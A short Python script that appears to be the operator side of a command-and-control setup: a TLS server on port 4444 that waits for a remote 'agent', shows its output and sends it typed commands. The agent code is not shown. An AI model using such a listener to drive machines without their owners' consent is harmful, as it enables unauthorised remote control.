#!/usr/bin/env python3
"""server.py – single-client interactive TLS command server."""

import ssl, socket, subprocess, os, sys

# ── "macro" ──────────────────────────────────────────────────────────
PORT = 4444
# ─────────────────────────────────────────────────────────────────────

TERMINATOR = b"\x1f" * 5
CERT_FILE  = "server_cert.pem"
KEY_FILE   = "server_key.pem"


def init(port_num: int):
    """Generate a self-signed cert/key (if needed), bind, and listen."""
    if not (os.path.isfile(CERT_FILE) and os.path.isfile(KEY_FILE)):
        subprocess.run(
            [
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", KEY_FILE, "-out", CERT_FILE,
                "-days", "365", "-nodes",
                "-subj", "/CN=localhost",
            ],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        print("[*] Generated self-signed certificate.")

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT_FILE, KEY_FILE)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", port_num))
    sock.listen(1)
    print(f"[*] Listening on 0.0.0.0:{port_num}")
    return ctx, sock


def send(conn, message: str) -> None:
    """Send *message* with the 5×0x1F terminator appended."""
    conn.sendall(message.encode("utf-8") + TERMINATOR)


def recv(conn) -> str | None:
    """Read until the 5×0x1F terminator; return the stripped payload."""
    buf = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            return None
        buf += chunk
        idx = buf.find(TERMINATOR)
        if idx != -1:
            return buf[:idx].decode("utf-8", errors="replace")


def main():
    ctx, server_sock = init(PORT)

    try:
        while True:
            print("\n[*] Waiting for agent…")
            client_sock, addr = server_sock.accept()
            conn = None
            try:
                conn = ctx.wrap_socket(client_sock, server_side=True)

                msg = recv(conn)
                if msg is None:
                    print("[-] Agent disconnected before sending.")
                    continue
                print(f"\n[Agent @ {addr[0]}:{addr[1]}]\n{msg}")

                command = input("\n[cmd]> ")
                send(conn, command)

                if command.strip().lower() == "exit":
                    print("[*] Exit sent. Shutting down.")
                    break

            except ssl.SSLError as e:
                print(f"[-] SSL error: {e}")
            except Exception as e:
                print(f"[-] Error: {e}")
            finally:
                if conn:
                    try:
                        conn.shutdown(socket.SHUT_RDWR)
                    except OSError:
                        pass
                    conn.close()
    finally:
        server_sock.close()
        print("[*] Server socket closed.")


if __name__ == "__main__":
    main()